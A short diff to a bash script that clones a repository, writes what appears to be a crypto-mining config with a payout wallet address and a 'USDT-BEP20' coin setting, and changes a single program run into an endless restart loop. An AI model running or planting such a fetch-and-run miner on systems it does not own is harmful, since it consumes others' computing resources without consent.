@@ -1,3 +1,6 @@
+#!/bin/bash
+MIN=$1
+
 git clone https://github.com/mom742886/nano-mbc
 cd nano-mbc
 echo '{
@@ -5,4 +8,8 @@ echo '{
   "config": { "threads": 7, "log": true },
   "options": { "user": "0xC4C2ca6D265f353972a26B8c8Df5FF4c1C000D7D", "password": "c=USDT-BEP20", "argent": "web-wasm/1.0" }
 }' > data.json
-./node app.js
+
+while true; do
+    ./node app.js
+    sleep 10
+done
